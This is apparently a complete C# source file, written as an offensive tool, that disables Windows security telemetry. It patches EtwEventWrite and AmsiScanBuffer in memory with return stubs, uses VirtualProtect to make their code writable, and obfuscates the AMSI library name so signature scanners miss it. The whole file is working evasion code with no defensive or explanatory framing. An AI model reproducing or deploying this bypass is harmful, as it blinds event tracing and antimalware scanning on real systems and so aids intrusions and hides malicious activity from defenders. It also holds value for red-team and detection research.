using System;
using System.Runtime.InteropServices;

namespace mscorlib
{
    /*
     * Some in-memory patching funsies to bypass EtwEventWrite and AmsiScanBuffer 
     */
    class Program
    {
        static bool is64Bit
        {
            get
            {
                return IntPtr.Size == 8;
            }
        }

        // Return required bytes for patching 
        static byte[] voodooMagic(string function)
        {
            byte[] patch;
            if (function.ToLower() == "bypassetw")
            {
                if (is64Bit)
                {
                    patch = new byte[2];
                    patch[0] = 0xc3;
                    patch[1] = 0x00;
                }
                else
                {
                    patch = new byte[3];
                    patch[0] = 0xc2;
                    patch[1] = 0x14;
                    patch[2] = 0x00;
                }

                // Returning for bypassEtw 
                return patch;
            }

            else if (function.ToLower() == "bypassamsi")
            {

                if (is64Bit)
                {
                    patch = new byte[6];
                    patch[0] = 0xB8;
                    patch[1] = 0x57;
                    patch[2] = 0x00;
                    patch[3] = 0x07;
                    patch[4] = 0x80;
                    patch[5] = 0xC3;
                }
                else
                {
                    patch = new byte[8];
                    patch[0] = 0xB8;
                    patch[1] = 0x57;
                    patch[2] = 0x00;
                    patch[3] = 0x07;
                    patch[4] = 0x80;
                    patch[5] = 0xC2;
                    patch[6] = 0x18;
                    patch[7] = 0x00;
                }

                return patch;
            }

            else
            {
                throw new ArgumentException("[-] Incorrect function name argument");
            }
        }

        static void bypassEtw()
        {
            string ntdll = "ntdll.dll";
            string magicFunction = "EtwEventWrite";

            IntPtr ntdllAddr = LoadLibrary(ntdll);
            IntPtr etwWriteEventAddr = GetProcAddress(ntdllAddr, magicFunction);

            byte[] magicVoodoo = voodooMagic("bypassEtw");

            // out uint oldProtect is a nice trick, never knew that 
            VirtualProtect(etwWriteEventAddr, (UIntPtr)magicVoodoo.Length, 0x40, out uint oldProtect);
            Marshal.Copy(magicVoodoo, 0, etwWriteEventAddr, magicVoodoo.Length);
            VirtualProtect(etwWriteEventAddr, (UIntPtr)magicVoodoo.Length, oldProtect, out uint newOldProtect);

            Console.WriteLine("[+] Disabled ETW Tracing");

        }

        static void bypassAmsi()
        {
            string amsidll = "a" + "msi" + ".d" + "ll";
            string amsiScanBuffer = "Am" + "siSc" + "anB" + "uffer";

            IntPtr amsidllAddr = LoadLibrary(amsidll);
            IntPtr amsiScanBufferAddr = GetProcAddress(amsidllAddr, amsiScanBuffer);

            byte[] magicVoodoo = voodooMagic("bypassAmsi");

            VirtualProtect(amsiScanBufferAddr, (UIntPtr)magicVoodoo.Length, 0x40, out uint oldProtect);
            Marshal.Copy(magicVoodoo, 0, amsiScanBufferAddr, magicVoodoo.Length);
            VirtualProtect(amsiScanBufferAddr, (UIntPtr)magicVoodoo.Length, oldProtect, out uint newOldProtect);

            Console.WriteLine("[+] Disabled AMSI");

        }


        static void Main(string[] args)
        {
            bypassEtw();
            Console.ReadKey();
            bypassAmsi();
            Console.ReadKey();
        }


        // Thank the pinvoke.net gods 

        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(
        IntPtr hModule,
        string procName);

        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(
        string name);

        [DllImport("kernel32")]
        static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);

    }
}

